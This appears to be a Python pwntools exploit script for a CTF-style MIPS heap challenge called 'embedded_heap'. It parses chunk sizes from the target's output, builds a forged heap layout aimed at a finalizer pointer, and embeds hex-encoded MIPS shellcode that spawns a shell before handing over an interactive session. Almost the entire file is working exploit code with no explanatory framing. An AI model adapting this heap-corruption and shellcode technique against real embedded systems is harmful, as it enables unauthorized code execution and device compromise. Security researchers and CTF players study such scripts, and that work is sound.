#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
from parse import *
context.log_level="debug"
pwn_file="./embedded_heap"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process("qemu-mips -g 1234 -L ./ ./embedded_heap".split(" "))
    pid=r.pid
else:
    r=remote("127.0.0.1",9332)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

r.recvuntil("=====\n")
pool = []
def align(size):
    if size <= 0xc:
        return 0x10
    else:
        size = (size+3)/4*4
        size = ((size -4)+7)/8*8 + 0x8
        return size

while True:
    line = r.recvline()
    if "Update" in line:
        break
    ret = parse("Chunk[{:d}]: {:d} bytes\n",line)
    pool.append(align(ret[1]))
def update(idx,size,data):
    r.sendlineafter("Command: ","1")
    r.sendlineafter("Index: ",str(idx))
    r.sendlineafter("Size: ",str(size))
    r.sendafter("Content: ",data)

def view(idx):
    r.sendlineafter("Command: ","2")
    r.sendlineafter("Index: ",str(idx))
    r.recvuntil("]: ")
    data = r.recvuntil("1.")[:-2]
    return data

def dele(idx):
    r.sendlineafter("Index: ",str(idx))

print map(hex,pool)
total = sum(pool)
heap_base = 0x55568000
state = 0x66D7C
fini = 0x1718C + 0x68000
dist = (((fini - state)&0xffffffff)/4 + 1)*8
dist = dist&0xffffffff
print dist
shellcode = "3c092f2f35296269afa9fff43c096e2f35297368afa9fff8afa0fffc27bdfff403a02020afa0fffc27bdfffc2806ffffafa6fffc23bdfffc03a030203c198c973739ffff03204827afa9fffc27bdfffc2805ffffafa5fffc23bdfffc2419fffb0320282700bd2820afa5fffc23bdfffc03a0282034020fab0101010c".decode("hex")
f = {
    pool[0] - 8 :p32(0) + p32(0x8,endian = 'big'),
    pool[1]+pool[0] - 8 : p32(0) + p32(dist,endian = 'big') +"bbbbbbbb",
    pool[1]+pool[0] - 8 + 0xd0:p32(pool[1]+pool[0] + 0x200 + heap_base,endian='big')+p32(0)+p32(4,endian='big'),
    pool[1]+pool[0] - 8 + 0x100:shellcode,
    pool[1]+pool[0] - 8 + 0x200:p32(pool[1]+pool[0] + 0x100 + heap_base,endian='big')
}
data = fit(f,filler="\x00")
update(0,len(data),data)
r.sendlineafter(":","3")
dele(1)
dele(2)
r.sendlineafter("Index: ","3")
r.sendlineafter("Size: ","2")
r.sendlineafter("Content: ","1")
r.interactive()














